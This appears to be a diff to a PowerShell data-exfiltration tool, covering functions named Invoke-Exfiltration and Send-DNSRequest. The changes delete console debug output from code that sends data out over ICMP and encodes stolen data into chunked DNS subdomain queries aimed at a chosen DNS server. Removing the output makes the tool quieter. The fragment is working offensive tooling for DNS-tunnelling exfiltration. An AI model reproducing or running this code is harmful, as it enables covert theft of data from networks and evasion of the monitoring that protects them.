@@ -61,7 +61,6 @@ function Invoke-Exfiltration {
       
         $IE = new-object -com internetexplorer.application;
         $q = Send-ICMPPacket $data
-        write-host $data
 
         for($i=0; $i-lt($repeat-1); $i++){
             
@@ -204,14 +203,12 @@ function Send-DNSRequest {
     for($i=0; $i-lt($repeat); $i++){
         $str = $data.Substring($i*$Split,$Split);
         $str = $jobid + $str + '.' + $dns;
-        write-host $str
         #$q = nslookup -querytype=A $str $server -timeout= 5;
         $q = Resolve-DnsName -Type A -Server $server -Name $str -QuickTimeout -ErrorAction SilentlyContinue
     };
     if($remainder){
         $str = $data.Substring($len-$remainder);
         $str = $jobid + $str + '.' + $dns;
-        write-host $str
         #$q = nslookup -querytype=A $str $server -timeout= 5;
         $q = Resolve-DnsName -Type A -Server $server -Name $str -QuickTimeout -ErrorAction SilentlyContinue
 
